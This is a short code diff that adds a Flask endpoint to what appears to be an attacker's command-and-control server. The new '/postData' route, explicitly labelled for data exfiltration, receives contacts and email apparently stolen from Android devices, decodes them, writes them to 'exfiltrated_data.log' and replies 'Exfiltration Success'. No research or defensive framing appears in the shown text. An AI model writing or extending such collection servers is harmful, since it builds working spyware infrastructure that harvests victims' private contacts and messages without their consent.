@@ -4,7 +4,9 @@ import os
 import base64
 import random
 import string
-
+from urllib.parse import parse_qs
+from datetime import datetime
+import re
 
 SERVER_HOSTNAME = socket.gethostname()
 SERVER_IP = socket.gethostbyname(SERVER_HOSTNAME)
@@ -47,7 +49,26 @@ def get_mk():
 
     return base64_str
 
+# Route for data exfiltration POST HTTP Request to process
+@app.route('/postData', methods=['POST'])
+def postData():
+    '''Android Contacts and Email is processed and stored into log file'''
+    if request.method == "POST":
+    	data = parse_qs(request.get_data()) #URL Decoding
+    	with open("exfiltrated_data.log", "a") as f:
 
+    	    f.write("Date " + datetime.now().strftime("%d/%m/%Y %H:%M:%S") + "\n")
+    	    for key,value in data.items():
+    	        f.write(str(key.decode('utf-8')) + "\n") 
+    	        for x in range(len(value)): 
+    	            decodedString = value[x].decode('utf-8') 
+    	            begin, end = decodedString.find('{'), decodedString.rfind('}')
+    	            filteredString = decodedString[begin: end+1]
+    	            f.write(filteredString + "\n")
+    	    f.write("\n")
+    	    f.close()
+    	
+    return "Exfiltration Success"
 
 # Custom methods
 def randStr(chars = string.ascii_lowercase + string.ascii_uppercase + string.digits, N=16):
